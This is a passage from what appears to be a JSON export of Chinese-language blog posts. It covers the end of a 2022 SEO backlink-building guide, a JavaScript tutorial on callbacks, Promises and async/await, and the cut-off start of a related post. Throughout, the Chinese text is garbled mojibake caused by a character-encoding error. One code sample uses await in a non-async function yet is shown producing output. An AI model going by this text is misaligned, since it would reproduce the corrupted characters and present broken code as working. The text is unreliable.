¼ï¼šæˆ‘å€‘ç¾éº—çš„æ˜Ÿçƒï¼Œæ›¾ç¶“éå¸¸æ™æ‰ã€‚\nç¢ºå¯¦ï¼ŒJulieã€€æ›¾ç™¼å¸ƒè¨±å¤šè‰¯å¥½çš„å…§å®¹ï¼Œå–®åœ¨å¥¹çš„è¨€è©ä¸­è¡¨ç¤ºï¼šä¸è«–æˆ‘çš„å…§å®¹æœ‰å¤šæ£’ï¼Œéƒ½æ²’æœ‰ä»»ä½•åå‘é€£çµã€‚\né€™å°±æ˜¯å¥¹æ±ºå®šä½¿ç”¨ã€Œæ‘©å¤©å¤§æ¨“æŠ€è¡“ã€çš„æ™‚æ©Ÿé»ã€‚\nå› æ­¤ï¼Œå¥¹ä¸å†åªæ˜¯å–®ç´”ç™¼å¸ƒå¦ä¸€å€‹è‰¯å¥½å…§å®¹ï¼Œè€Œæ˜¯å‰µé€ å‡ºé©šäººçš„äº‹ç‰©ã€‚\nä»¥ä¸‹æ˜¯ä¾‹å­ï¼š\nå¥¹ä½¿ç”¨é›»å­éƒµä»¶æ¨å»£å»å‰µç«‹åå‘é€£çµï¼Œè€Œéå–®ç´”å‰µé€ å¥½å…§å®¹ä¸¦ç­‰å¾…è¢«æ¨å»£ã€‚\né€™ä½¿å¥¹å–å¾—å¾è‡ªç„¶é ˜åŸŸçš„æ¬Šå¨ç¶²ç«™ï¼Œå–å¾—æ»¿æ‰‹çš„é€£çµã€‚\né€™äº›ç™½å¸½åå‘é€£çµï¼Œä½¿å¥¹è‡ªç„¶æœå°‹å¢åŠ äº† 194%ã€‚\nç‚ºä½•ã€Œæ‘©å¤©å¤§æ¨“æŠ€è¡“ã€é‹ä½œå¾—å¦‚æ­¤è‰¯å¥½ï¼Ÿ\n:::info\næ ¹æ“š Julie æ‰€èªªï¼š\nã€Œè®“é€™ä»¶äº‹å¦‚æ­¤æˆåŠŸçš„åŸå› ï¼Œåœ¨æ–¼å»ºç«‹åå‘é€£ç¯€å°±åƒèˆ‡ä»–äººå»ºç«‹é—œä¿‚ã€‚ã€\nã€Œäººå€‘åœ¨çŸ¥é“ä½ çš„ç¶²ç«™å­˜åœ¨å‰ï¼Œä¸æœƒé€£çµä½ çš„å…§å®¹ã€‚ã€\nã€Œæ­¤å¤–ï¼Œåœ¨ä½ ä¸»å‹•å‘Šè¨´ä»–å€‘ä»¥å‰ï¼Œä¹Ÿä¸æœƒçŸ¥é“ä½ çš„ç¶²ç«™å­˜åœ¨ã€‚ã€\n:::\nèªªçš„éå¸¸å¥½ã€‚\næ¡ˆä¾‹äºŒ ç ´æé€£çµå„ªåŒ–çš„å›å ± å»å¹´ï¼Œæˆ‘æ±ºå®šåŸ·è¡Œç ´æé€£çµå„ªåŒ–çš„è¡ŒéŠ·æ´»å‹•ã€‚\nå› æ­¤ï¼Œæˆ‘éµå¾ªåœ¨ä¸Šä¸€ç« ç¯€çš„æµç¨‹ã€‚\né¦–å…ˆï¼Œæˆ‘ä½¿ç”¨æœå°‹å­—ä¸²ï¼Œä»¥æ‰¾å‡ºå«æœ‰è¨±å¤šå¤–éƒ¨é€£çµçš„ç¶²é ã€‚\næ¥è‘—ï¼Œæˆ‘ä½¿ç”¨ Check My Links æ‰¾å‡ºç ´æçš„é€£çµã€‚\nä¹‹å¾Œï¼Œæˆ‘å¯„ä¿¡çµ¦è² è²¬è©²å…§å®¹çš„äººï¼Œä¸¦è¡¨ç¤ºè‡ªå·±æœ‰ç™¼ç¾çš„ç ´æé€£çµå­˜åœ¨ã€‚\nï¼ˆä»”ç´°æŸ¥çœ‹è©²ä¿¡ä»¶æœ‰å¤šéº¼å®¢è£½åŒ–ï¼‰\næ”¶åˆ°å°æ–¹çš„å›æ‡‰å¾Œï¼Œæˆ‘å¯„çµ¦ä»–å€‘é‚£äº›å¤±æ•ˆçš„é€£çµï¼Œä»¥åŠä¾†è‡ª Backlinko çš„ä¸€å¤§å †å…§å®¹ï¼Œç”¨ä»¥é€²è¡Œ 1:1 æ›¿æ›ã€‚\nè€Œå¤§å¤šæ•¸çš„å¤¥ä¼´ï¼Œéƒ½éå¸¸æ¨‚æ„å¢æ·»æˆ‘çš„é€£çµï¼š\næ¡ˆä¾‹ä¸‰ Matt å¦‚ä½•å„ªåŒ–å®ƒçš„é›»å­å•†å‹™é€£çµ è®“æˆ‘å€‘é¢å°ä¸€å€‹äº‹å¯¦ï¼š\nå»ºç«‹åå‘é€£çµï¼Œå°é›»å•†ç¶²ç«™ä¾†èªªä¸¦ä¸å®¹æ˜“ã€‚\nä½†ä»–ä»æœ‰å¯èƒ½ï¼Œå°±å¦‚åŒ Matt Lawry ä¸€æ¨£ã€‚\nå¦‚åŒå¤šæ•¸é›»å•†ç¶²ç«™æ“æœ‰è€…ï¼ŒMatt å°æ–¼å»ºç«‹ä»–é›»å•†ç¶²ç«™çš„é€£çµæœ‰éº»ç…©ï¼ˆä¸€å€‹å°ˆæ³¨åœ¨ç¦®ç‰©çš„æ¾³æ´²ç¶²ç«™ï¼‰\nç•¢ç«Ÿï¼Œæœ‰èª°æƒ³è¦é€£çµåˆ°ä¸€å€‹ 100% ç”¢å“å°å‘çš„é é¢ã€‚\né€™è®“ Matt äº†è§£åˆ°ï¼Œå®ƒå¯ä»¥ä½¿ç”¨å…§å®¹ç‚ºç¶²ç«™å‰µé€ åå‘é€£çµã€‚\nå…·é«”ä¾†èªªï¼ŒMatt åœ¨å®ƒçš„ç¶²ç«™å‰µé€ ä¸€ç¯‡ã€Œæ‘©å¤©å¤§æ¨“ã€å…§å®¹ï¼šã€Šæ¾³æ´²ç´é…’ï¼šçµ‚æ¥µæŒ‡å—ã€‹\nç•¶ç„¶ï¼ŒMatt ä¸¦æ²’æœ‰åä¸‹ä¾†ä¸¦ç­‰å¾…é€£çµç´¯ç©ã€‚\nä»–é€éé›»å­éƒµä»¶ï¼Œä¸»å‹•æ¨å»£è‡ªå·±çš„å…§å®¹ã€‚\nå› ç‚º Matt è¯ç¹«ä¸Šæ­£ç¢ºçš„äººï¼ˆä¸¦å¯„çµ¦ä»–å€‘å®¢è£½åŒ–çš„é›»å­éƒµä»¶ï¼‰ï¼Œè¨±å¤šäººé¡˜æ„æä¾›é€£æ¥çµ¦ä»–çš„æŒ‡å—ã€‚\né€™äº›é€£çµéƒ½åŠ å¼·äº† Matt çš„é›»å•†ç¶²ç«™ï¼Œåœ¨æœå°‹çµæœé æƒ³è¦çˆ­å–çš„é—œéµå­—ï¼šæ¾³æ´²ç´é…’ã€‚\nç¬¬ 8 ç« ï¼šé€²éšé€£çµå„ªåŒ–æŠ€å·§ ä»¥ä¸‹æ¸…å–®ï¼Œæ˜¯æˆ‘ç‚ºäº†æŒ‘é¸é€™å¹¾å¹´ï¼Œä¸€äº›é€²éšé€£çµå„ªåŒ–çš„æŠ€å·§ã€‚\nå¾ã€Œé€£çµå›æ”¶ã€è¼•é¬†å–å¾—åå‘é€£çµ æ¯ç•¶æœ‰äººåœ¨æ–‡ç« ä¸­æåŠä½ çš„å“ç‰Œï¼Œä»–å€‘éƒ½æœƒé€£çµä½ å°å§ï¼Ÿ\néŒ¯ã€‚\næˆ‘çš„æ„æ€æŒ‡ï¼Œä»–å€‘ã€Œæ‡‰è©²ã€é€£çµä½ ï¼Œä½†ä¸¦éç¸½æ˜¯æœƒç™¼ç”Ÿã€‚\nä»¥ä¸‹æ˜¯æˆ‘æƒ³è¡¨é”çš„æ„æ€ï¼š\nä½†è—‰ç”±è¼•æ¨ä¸€æŠŠï¼Œå¤šæ•¸ç¶²ç«™æ“æœ‰äººéƒ½éå¸¸æ¨‚æ„ï¼Œå°‡æåŠä½ çš„éƒ¨åˆ†è½‰æˆä¸€å€‹é€£çµã€‚\nä½ è¦å¦‚ä½•ç™¼ç¾äº›æœªå«é€£çµçš„æåŠå‘¢ï¼ŸBuzzSumo æ•ˆæœéå¸¸å¥½ã€‚\né€éåå‘åœ–ç‰‡æœå°‹ï¼Œå–å¾—ã€Œé¡å¤–ã€é€£çµ è«‹å•ä½ æ˜¯å¦ç™¼å¸ƒè¦–è¦ºè³‡ç”¢ï¼ˆå¦‚è³‡è¨Šåœ–è¡¨ã€ç¤ºæ„åœ–ï¼‰ï¼Ÿ\nå¦‚æœæœ‰ï¼Œé‚£ç¾åœ¨å¯èƒ½æœ‰æŸäº›ç¶²ç«™æ­£ä½¿ç”¨ä½ çš„åœ–ç‰‡ï¼Œå»æ²’æœ‰è¨»æ˜ä¾†æºã€‚\nä¸è¦åš‡åˆ°ã€‚äº‹å¯¦ä¸Šï¼Œä½ æ‡‰è©²æ…¶ç¥ã€‚\nå¦‚åŒé€£çµé‡æ–°å–å¾—ï¼Œä¸€å°å‹å–„çš„éƒµä»¶å¯ä»¥å°‡é€™äº›æ©Ÿæœƒè½‰æˆé€£çµã€‚\nä½ å¯ä»¥ä½¿ç”¨ Google ä»¥åœ–æœå°‹ï¼Œæ‰¾åˆ°é‚£äº›ä½¿ç”¨ä½ åœ–ç‰‡ï¼Œå»æ²’æœ‰æ·»åŠ é€£çµçš„äººå€‘ :\nåœ¨ä¸‹åˆå¯„é€é›»å­éƒµä»¶ ä»¥ä¸‹æ˜¯æˆ‘å¯„é€ä¸Šåƒå°é›»å­éƒµä»¶å¾Œï¼Œå¾ä¸­å­¸åˆ°çš„äº‹æƒ…ã€‚\nåœ¨ä¸‹åˆï¼ˆæ”¶ä»¶è€…æœ¬åœ°æ™‚é–“ï¼‰å¯„é€ä½ çš„æ¨å»£é›»å­éƒµä»¶ã€‚\nç‚ºä»€éº¼ï¼Ÿ\nç•¶ä½ åœ¨æ—©ä¸Šå¯„é€ä½ çš„è¨Šæ¯ï¼Œå®ƒå°‡æœƒè¢«æ”¶ä»¶è€…ï¼Œèˆ‡å…¶ä»– 93 å°è¨Šæ¯æ··åœ¨ä¸€èµ·è™•ç†ã€‚\nä½†ç•¶ä½ åœ¨ä¸‹åˆå¯„é€é›»å­ï¼Œæ”¶ä»¶å¤¾å°±æœƒå°‘æ‰è¨±å¤šç«¶çˆ­è€…ã€‚\næˆ‘æ¨è–¦ Gmail å…§å»ºçš„æ™‚é–“æ’æˆåŠŸèƒ½ï¼Œå¹«ä½ è¦ç•«æ¨å»£ä¿¡ç™¼é€æ™‚é–“ã€‚\nå‰µé€ è¦–è¦ºåŒ–çš„æ¦‚å¿µã€é»å­èˆ‡ç­–ç•¥ ä»¥ä¸‹æ˜¯ä¾†è‡ª Backlinko å¯¦éš›çš„ä½œç‚ºï¼š\nä¸ç®¡ä½ ç›¸ä¸ç›¸ä¿¡ï¼Œè¨±å¤šäººéƒ½å› ç‚ºé€™å¼µç°¡å–®ç‰‡èˆ‡æˆ‘é€£çµï¼š\nç‚ºä½•å®ƒå¦‚æ­¤æœ‰æ•ˆï¼Ÿ\næ©\u0026hellip;æˆ‘å¯ä»¥å–®ç´”é€éæ–‡å­—æè¿° APP æ”»å‹¢ï¼Œä½†é€™å°‡ä½¿æˆ‘çš„å…§å®¹æ¯”è¼ƒä¸å®¹æ˜“åˆ†äº«ã€‚\nå¦ä¸€æ–¹é¢ï¼Œç•¶ä½ å‰µé€ ä¸€å€‹è¦–è¦ºåœ–åƒï¼Œä½ å°‡æœƒæ“æœ‰éƒ¨è½å®¢æ¨‚æ–¼åˆ†äº«çš„å…§å®¹ï¼ˆä¸¦é€£çµä½ çš„ç¶²ç«™ï¼‰ã€‚\nåœ¨çµæŸå‰å¯„é€è©¦æ¢éƒµä»¶ ä½ æ‡‰è©²åœ¨ç¬¬ä¸€å°é›»å­éƒµä»¶æ¨å»£ä¸­ï¼Œè¦æ±‚å°æ–¹æä¾›åå‘é€£çµå—ï¼Ÿ\nç°¡çŸ­å›ç­”ï¼šå¯èƒ½å¯ä»¥ã€‚\nä½ ä¹Ÿå¯ä»¥é€éå…©éšæ®µæµç¨‹ï¼Œå–å¾—æ›´å¥½çš„çµæœã€‚\nï¼ˆBacklinko è®€è€… Mike ç™¼ç¾æ¸¬è©¦éƒµä»¶çš„æˆæ•ˆï¼Œè¼¾å£“ç›´æ¥è¦æ±‚é€£çµçš„æ–¹å¼ï¼‰\né€™å€‹æ–¹æ³•çš„å¦ä¸€å€‹å¥½è™•ï¼Œå¯ä»¥æ¸›å°‘ä½ èŠ±è²»çš„æ™‚é–“ã€‚\nèˆ‡å…¶èŠ±è²»æ™‚é–“ï¼Œå®¢è£½åŒ–ä¸€å°æ²’äººé–±è®€çš„è¨Šæ¯ï¼Œå…ˆå¯„é€ç°¡çŸ­è©¦æ¢éƒµä»¶æ›´å¥½ã€‚\nä¹‹å¾Œï¼Œå†é‡å°ä½ ä¸‹ä¸€å‰‡è¨Šæ¯é€²è¡Œå®¢è£½åŒ–ã€‚\nç²å¾— Podcast çš„è¨ªè«‡ æ²’éŒ¯ï¼Œå®¢åº§æ–‡ç« æœ‰ä»–çš„é‡è¦åœ°ä½å­˜åœ¨\nä½†æœ‰ä¸€å€‹å¤§å•é¡Œï¼šå®ƒéœ€è¦èŠ±è²»å¾ˆå¤šæ™‚é–“æ’°å¯«ï¼\né€²å…¥ã€€Podcastã€€çš„ä¸–ç•Œã€‚\nèˆ‡å…¶èŠ±è²»æ™‚é–“æ’°å¯«å¤§ç¶±ã€æ“¬è‰ç¨¿ã€ä¿®æ”¹å®¢åº§æ–‡ç« ï¼Œä¸å¦‚å–®ç´”å‡ºç¾åœ¨ Podcast ç¯€ç›®ï¼Œä¸¦è«‡è«–ä½ æ‰€çŸ¥é“çš„å…§å®¹ã€‚\nè¹¦ï¼ä½ å°±å–å¾—äº†åå‘é€£çµã€‚\næœ€å¥½çš„åœ°æ–¹æ˜¯ä»€éº¼ï¼Ÿ\næ¯å€‹é ˜åŸŸéƒ½æœ‰ Podcast ç¯€ç›®ã€‚\nä»¥ä¸‹åå‘é€£ç¯€ï¼Œå°±æ˜¯æˆ‘å‡ºç¾åœ¨ Podcast å¾Œå»ºç«‹çš„ã€‚\nä½¿ç”¨ã€Œé€£çµäº¤é›†ã€æ‰¾å‡ºå¯èƒ½é€£çµè€… å¦‚æœæŸäººé€£çµçµ¦ä½ çš„ç«¶çˆ­è€…ï¼Œä»–å€‘å¯èƒ½ä¹Ÿæœƒæä¾›é€£çµçµ¦ä½ å°å§ï¼Ÿ\næ²’éŒ¯ã€‚\nå¦‚æœæŸäººé€£çµä½ çš„ 2 ä½ç«¶çˆ­è€…ï¼Œä»–ç”šè‡³æ›´æœ‰å¯èƒ½æä¾›é€£çµçµ¦ä½ ã€‚\nä½ å¦‚ä½•æ‰¾åˆ°é€™äº›ï¼Œé€£çµè¶…é 1 ä½ä»¥ä¸Šç«¶çˆ­è€…çš„ç¶²ç«™ã€‚\nSemrush Backlink Gap tool åªè¦åˆ—å‡º 2 åˆ° 3 ä½ä½ æœ€å¤§çš„ç¶²ç«™ç«¶çˆ­è€…ã€‚\né€™å€‹çµ•ä½³çš„å·¥å…·ï¼Œå°‡æœƒå‘ä½ é¡¯ç¤ºå“ªäº›äººèˆ‡ä»–å€‘é€£çµã€‚\nä½¿ç”¨ã€Œé å…ˆç­–ç•«ã€çš„é€£çµç›®æ¨™æ¸…å–® ä¸èƒ½å¦èªï¼šæ‰¾åˆ°é«˜å“è³ªçš„åå‘é€£çµéå¸¸å›°é›£ã€‚\né€™æ˜¯å€‹å£æ¶ˆæ¯ã€‚\nå¥½æ¶ˆæ¯æ˜¯ï¼Œæœ‰äº›äººå·²ç¶“ç‚ºä½ é å…ˆç­–ç•«å¥½ï¼Œé€™äº›é«˜å“è³ªçš„ç¶²ç«™\u0026hellip;\n\u0026hellip;ä»¥ã€Œæœ€ä½³éƒ¨è½æ ¼ã€æ¸…å–®çš„å½¢å¼ã€‚\nä»¥ä¸‹æ˜¯ç¯„ä¾‹ï¼š\næ›´ä¸ç”¨èªªï¼Œå¦‚æœä½ å†ç¶“ç‡Ÿä¸€å€‹çƒ˜ç„™éƒ¨è½æ ¼ï¼Œæ¯ä¸€å€‹ç¶²ç«™æ¸…å–®çš„é é¢ï¼Œéƒ½å°‡æœƒæ˜¯ä¸€å€‹åå‘é€£çµçš„å¥½æ©Ÿæœƒã€‚\nä½ å¯ä»¥é€éä»¥ä¸‹æœå°‹å­—è©ï¼Œæ‰¾åˆ°é€™äº›æ¸…å–®ï¼š\næœ€å¥½çš„ã€Œä¸»é¡Œã€éƒ¨è½æ ¼ ã€Œä¸»é¡Œã€éƒ¨è½æ ¼æ¸…å–®ã€‚ çµè«– ä»¥ä¸Šé€™å°±æ˜¯æˆ‘çš„ 2022 é€£çµå„ªåŒ–æŒ‡å—ã€‚\nå¾ä»Šå¤©çš„æŒ‡å—ä¸­ï¼Œä½ æœ€æƒ³è¦å„ªå…ˆå˜—è©¦å“ªå€‹ç­–ç•¥å‘¢ï¼Ÿæˆ–ä½ å°æ–¼æŸä»¶äº‹æœ‰ç–‘å•ã€‚\nä¸è«–å¦‚ä½•ï¼Œåœ¨åº•ä¸‹ç•™è¨€è®“æˆ‘çŸ¥é“ã€‚\n","date":"2022-08-17T00:00:00Z","image":"https://live.staticflickr.com/65535/52290179402_693c7086dc_o.jpg","permalink":"https://wayneblog.ga/2022-08-17/seo-backlinks-building-guide/","title":"SEO åå‘é€£çµå»ºç«‹ï¼šçµ‚æ¥µæŒ‡å—(2022)"},{"content":" åƒè€ƒå½­å½­ - å›å‘¼å‡½å¼ Callbacksã€Promises ç‰©ä»¶ã€Async/Await éåŒæ­¥æµç¨‹æ§åˆ¶\nå‰è¨€ Javascript çš„ä¸»è¦ç‰¹é»æœ‰å…©å€‹ï¼š\nSingle Thread (å–®ç·šç¨‹) Synchronous (åŒæ­¥) ç•¶ä¸»ç¨‹å¼ä¸­é‡åˆ°ã€ŒéåŒæ­¥ã€çš„å‡½å¼å¦‚æ’ç¨‹ã€å–è³‡æ–™ã€è®€æª”\u0026hellip;ç­‰ç›¸é—œçš„å‡½å¼æ™‚(å¦‚ï¼šsetTimeoutã€fetch\u0026hellip;ç­‰)ï¼Œä¸»ç¨‹å¼ä¸¦ä¸æœƒåœæ­¢ä¸¦ç­‰å¾…å‡½å¼åŸ·è¡Œå®Œæˆå¾Œæ‰ç¹¼çºŒå¾€ä¸‹è·‘ï¼Œè€Œæ˜¯æœƒå°‡å…¶æ”¾åˆ° queue ä¸­ç›´åˆ°æ‰€æœ‰ç¨‹å¼ç¢¼éƒ½è·‘å®Œäº†ï¼ŒJavascript æœƒå†å›é ­åˆ° queue ä¸­æŒ‰é †åºå°‡ function æ‹‰å›ä¾†è™•ç†ã€‚\n1 2 3 4 5 console.log(\u0026#34;ç¨‹å¼é–‹å§‹\u0026#34;); setTimeout(() =\u0026gt; { console.log(\u0026#34;éåŒæ­¥äº‹ä»¶\u0026#34;); }, 0) console.log(\u0026#34;ç¨‹å¼çµæŸ\u0026#34;); ç¨‹å¼é–‹å§‹\nç¨‹å¼çµæŸ\néåŒæ­¥äº‹ä»¶ \u0026lt;- æœ€å¾ŒåŸ·è¡Œ\nä¸Šæ®µçš„åŸå§‹ç¢¼ä¸­ï¼ŒsetTimeout æ‰€å®šç¾©çš„æ™‚é–“ç‚º 0ï¼Œä½†å› ç‚ºæ˜¯å±¬æ–¼éåŒæ­¥äº‹ä»¶ï¼Œå› æ­¤é‚„æ˜¯æœƒåœ¨å…¶ä»–åŸå§‹ç¢¼é‹è¡Œå®Œä»¥å¾Œæ‰åŸ·è¡Œï¼Œåœ¨ Ajax çš„è¡Œç‚ºä¸­ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œç•¶éœ€è¦ç¢ºä¿æ“·å–åˆ°é ç«¯è³‡æ–™æ‰ç¹¼çºŒå¾€ä¸‹åŸ·è¡Œæ™‚ï¼Œå¦‚æœç¨‹å¼ç¢¼æ˜¯ä¾åºæ’°å¯«çš„æ–¹å¼ï¼Œå°±æœƒç„¡æ³•æ­£ç¢ºå‘ˆç¾è³‡æ–™ï¼Œä»¥ä¸‹èˆ‰å€‹ä¾‹å­ç¤ºç¯„ã€‚\nèˆ‰ä¾‹ ä»¥ä¸‹ç‚ºä¾‹ï¼Œæ­¤ç‚ºä¸€å€‹å¾ˆåŸºæœ¬çš„å›å‚³n1+n2çš„çµæœçš„å‡½å¼ã€‚\n1 2 3 4 5 6 7 8 9 function add(n1, n2) { return n1+n2; } function test() { let result = add(3, 4); console.log(result) } test(); 1 \u0026gt; 7 ä½†è‹¥ä»Šå¤©éœ€æ±‚éœ€è¦å»¶é²å…©ç§’å†å°‡çµæœæ‰“å°å‡ºä¾†æ™‚ã€‚\n1 2 3 4 5 6 7 8 9 10 11 function delayedAdd(n1, n2, delayTime) { window.setTimeout(function() { return n1+n2; }, delayTime); } function test() { let result = delayedAdd(3, 4, 2000); console.log(result); } test(); 1 \u0026gt; undefined æ­¤æ™‚æœƒç™¼ç¾æ‰“å°å‡ºä¾†çš„ result å› ç‚º delayedAdd é‚„æœªå°‡çµæœå›å‚³ï¼Œå°è‡´ç›´æ¥é¡¯ç¤º undefinedï¼Œæ­¤æ™‚å°±éœ€è¦ä¾†è§£æ±ºé€™ç¨®éåŒæ­¥æµç¨‹çš„æ§åˆ¶ã€‚\næ–¹æ³•1ï¼šCallbacks å›å‘¼å‡½å¼ æœ€æ—©æœŸä½¿ç”¨çš„æ–¹å¼ï¼Œæ–¼å‡½å¼æœ€å¾Œè¨­å®šcallbackï¼ŒåŸ·è¡Œéœ€è¦åšçš„äº‹æƒ…ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // Callback å›å‘¼å‡½å¼ function delayedAdd(n1, n2, delayTime, callback) { // è¨­å®šæ’ç¨‹ï¼Œå»¶é²ä¸€æ®µæ™‚é–“å¾ŒåŸ·è¡Œ window.setTimeout(function() { // å»¶é²ä¸€æ®µæ™‚é–“ä¹‹å¾Œï¼Œè¨ˆç®—åŠ æ³•ï¼Œå‘¼å« callback å‡½å¼ callback(n1+n2); }, delayTime); } function test() { delayedAdd(3, 4, 2000, function(result) { console.log(result); }); } test(); 1 \u0026gt; 7 æ–¹æ³•2ï¼šPromise ç‰©ä»¶ è¿‘æœŸæ–¼ES6æå‡ºçš„æ–°æ–¹å¼ã€‚ å»ºç«‹ promise ç‰©ä»¶ï¼šnew Promise(åŸ·è¡Œå‡½å¼) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ let p = new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // å‘¼å«resolveå°‡çµæœå›å‚³ }, delayTime); }); return p; } function test() { let promise = delayedAdd(3, 4, 2000); promise.then(function(result){ console.log(result); }); } test(); 1 \u0026gt; 7 å¸¸è¦‹å¯«æ³•ï¼Œç›´æ¥ return promise 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // å‘¼å«resolveå°‡çµæœå›å‚³ }, delayTime); }); } function test() { let promise = delayedAdd(3, 4, 2000); promise.then(function(result){ console.log(result); }); } test(); 1 \u0026gt; 7 new Promise(resolve, reject) çš„ resolve èˆ‡ reject ç‚º Promise åŸç”Ÿæä¾›ï¼Œå¯è‡ªè¡Œæ”¹åä½†é †åºä¸å¯ç•°å‹•ã€‚ resolve å°æ‡‰.then()ä¸”ä»£è¡¨æˆåŠŸï¼Œè€Œ reject å‰‡å°æ‡‰åˆ° .catch()ä¸”ä»£è¡¨å¤±æ•—ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { reject(n1+n2); // è‹¥ä½¿ç”¨rejectï¼Œå‰‡éœ€ä½¿ç”¨.catch }, delayTime); }); } function test() { let promise = delayedAdd(3, 4, 2000); // å› ä½¿ç”¨ reject å›å‚³ï¼Œé€™è£¡ä½¿ç”¨ .catch ä¾†æ¥ promise.catch(function(error){ console.log(error); }); } test(); 1 \u0026gt; 7 æ–¹æ³•3ï¼šAsync/Await ï¼ŒPromise çš„èªæ³•ç³– Promiseçš„èªæ³•ç³–ï¼Œä»¥ä¾¿æ–¼æ›´ç›´è§€çš„é–±è®€èˆ‡æ’°å¯«éåŒæ­¥æµç¨‹ï¼ŒåŒ Promise æ–¼ES6æå‡ºçš„æ–°ç©æ„å…’ã€‚ æ³¨æ„ï¼šawait çš„å‡½å¼å¿…é ˆè¦ç¢ºä¿æœ‰Promiseï¼Œå¦å‰‡å°‡å ±éŒ¯ã€‚ éœ€å…ˆå®£å‘Šç‚º async å‡½å¼ï¼Œæ‰èƒ½ä½¿ç”¨ awaitã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // è‹¥ä½¿ç”¨rejectï¼Œå‰‡éœ€ä½¿ç”¨.catch }, delayTime); }); } // éœ€å…ˆå®£å‘Šç‚º async å‡½å¼ï¼Œæ‰å¯ä½¿ç”¨ await async function test() { let result = await delayedAdd(3, 4, 2000); console.log(result); } test(); 1 \u0026gt; 7 æ³¨æ„ï¼šä½¿ç”¨ await æ™‚ï¼Œä¸»ç¨‹å¼æœƒç¢ºå¯¦åœæ­¢ï¼Œç­‰å¾… await å‡½å¼åŸ·è¡Œå®Œæˆå¾Œï¼Œæ‰æ¥çºŒå¾€ä¸‹è·‘ï¼Œèˆ‰ä¾‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // è‹¥ä½¿ç”¨rejectï¼Œå‰‡éœ€ä½¿ç”¨.catch }, delayTime); }); } // éœ€å…ˆå®£å‘Šç‚º async å‡½å¼ï¼Œæ‰å¯ä½¿ç”¨ await async function test() { let result = await delayedAdd(3, 4, 2000); console.log(result); console.log(\u0026#34;Hello\u0026#34;); } test(); 1 2 \u0026gt; 7 \u0026gt; Hello å»¶ä¼¸ä¸€ï¼šå¤šå€‹ Promise çš„è³‡æ–™è™•ç†ï¼šPromise.all() è‹¥é‡åˆ°å¤šå€‹ Promiseï¼Œä¸”éœ€å°‡å„å€‹ Promise çš„çµæœé€²è¡Œé‹ç®—æ™‚ï¼Œå¯ä½¿ç”¨ Promise.all() ä¾†è™•ç†ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // å‘¼å«resolveå°‡çµæœå›å‚³ }, delayTime); }); } function test() { let promise1 = delayedAdd(3, 4, 2000); let promise2 = delayedAdd(2, 3, 3000); // å¤šå€‹ Promise éƒ½å®Œæˆä¹‹å¾Œï¼Œå°‡å…¶æ•¸å€¼ç›¸ä¹˜ Promise.all([promise1, promise2]).then(function(results){ // æ­¤æ™‚ results ç‚ºä¸€å€‹é™£åˆ— \u0026gt; [7, 5]; let answer = results.reduce(function(total, value) { return total * value; }) console.log(answer); }); } test(); 1 \u0026gt; 35 å»¶ä¼¸äºŒï¼šå¤šå€‹ Promise ä½¿ç”¨ Async/Await 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // å‘¼å«resolveå°‡çµæœå›å‚³ }, delayTime); }); } function test() { let result1 = await delayedAdd(3, 4, 2000); let result2 = await delayedAdd(2, 3, 3000); let answer = result1 * result2; console.log(answer); } test(); 1 \u0026gt; 35 ","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52282531224_1f57c841ee_o.jpg","permalink":"https://wayneblog.ga/2022-08-13/js-async-programs/","title":"ã€Callbackã€Promiseã€Async/Awaitã€‘è™•ç†éåŒæ­¥äº‹ä»¶"},{"content":" æœ¬æ–‡åƒè€ƒç¶²å€\nä»€éº¼æ˜¯ asyncï¼Ÿä»€éº¼æ˜¯ awaitï¼Ÿ åœ¨ JavaScript çš„ä¸–ç•Œï¼ŒåŒæ­¥ sync å’ŒéåŒæ­¥ async çš„æ„›æ¨æƒ…ä»‡ï¼Œå°±å¦‚åŒå¶åƒåŠ‡ä¸€èˆ¬çš„å‰ªä¸æ–·ç†é‚„äº‚ï¼Œç‰¹åˆ¥åƒæ˜¯setTimeoutã€setIntervalã€MLHttpRequestæˆ–fetché€™äº›åŒæ­¥éåŒæ­¥æ··é›œçš„ç”¨æ³•ï¼Œéƒ½æœƒè®“äººä¸€å€‹é ­å…©å€‹å¤§ï¼Œå¹¸å¥½ ES6 å‡ºç¾äº† promiseï¼ŒES7 å‡ºç¾äº† 